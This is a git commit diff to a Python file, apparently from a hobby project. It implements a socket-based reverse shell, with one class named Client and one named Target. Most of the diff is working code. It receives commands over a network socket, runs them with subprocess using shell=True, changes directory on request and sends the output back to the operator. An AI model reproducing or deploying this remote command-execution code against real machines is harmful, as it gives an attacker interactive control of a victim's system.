fefc176a022129520c5c17d906ed099bd4fa644c
Ulysse Wéry <32456856+Gloxx88@users.noreply.github.com>
2018-12-22 18:38:34 +0100

    Update Objet_Us_Target.py

--- Objet_Us_Target.py
+++ Objet_Us_Target.py
@@ -25,28 +25,19 @@ class Client(Machine):
     def connect_to_server(self):
         self.s.connect((self.host, self.port))
 
-    def reverse_shell_client(self):
+    def reverse_shell_send_command(self):
         while True:
-            data = self.s.recv(1024)
-            if data.decode("utf-8") == "quit":
-                print("Client program Shutdown")
-                self.s.send(str.encode("Client Program Shutdown"))
+            cmd = input()
+            if cmd == "quit":
+                self.s.send(str.encode(cmd))
+                client_response = str(self.s.recv(1024), "utf-8")
+                print(client_response)
+                self.quit()
                 break
-            else:
-                try:
-                    if data[:2].decode("utf-8") == 'cd':
-                        os.chdir(data[3:].decode("utf-8"))
-                    if len(data) > 0:
-                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        print(cmd)
-                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                        output_str = output_bytes.decode("utf-8", errors='replace')
-                        self.s.send(str.encode(output_str + str(os.getcwd()) + "> "))
-                        print(output_str)
-                except OSError as msg:
-                    error_msg = "Error OS : " + str(msg)
-                    print(error_msg)
-                    self.send(str.encode(error_msg))
+            if len(str.encode(cmd)) > 0:
+                self.s.send(str.encode(cmd))
+                client_response = str(self.s.recv(1024), "utf-8")
+                print(client_response, end="")
 
     def quit(self):
         pass
@@ -78,32 +69,38 @@ class Target(Machine):
         conn, address = self.s.accept()
         print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))
 
-    def reverse_shell(self):
+    def reverse_shell_target(self):
         while True:
-            cmd = input()
-            if cmd == "quit":
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(1024), "utf-8")
-                print(client_response)
-
-                self.quit()
+            data = conn.recv(1024)
+            if data.decode("utf-8") == "quit":
+                print("Client program Shutdown")
+                conn.send(str.encode("Client Program Shutdown"))
                 break
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(1024), "utf-8")
-                print(client_response, end="")
-
-    def print_on_both(self, msg):
-        conn.send(str.encode(msg))
-        print(msg)
+            else:
+                try:
+                    if data[:2].decode("utf-8") == 'cd':
+                        os.chdir(data[3:].decode("utf-8"))
+                    if len(data) > 0:
+                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        print(cmd)
+                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                        output_str = output_bytes.decode("utf-8", errors='replace')
+                        conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
+                        print(output_str)
+                except OSError as msg:
+                    error_msg = "Error OS : " + str(msg)
+                    print(error_msg)
+                    conn.send(str.encode(error_msg))
 
     #close de connection and the socket
     def quit(self):
         try:
             conn.close()
-            self.print_on_both("connection close")
+        except socket.error as msg:
+            print("Error conn to close: " + str(msg))
+
+        try:
             super().quit()
-            self.print_on_both("socket close")
         except socket.error as msg:
             print("the socket fail to close : " + str(msg))
 
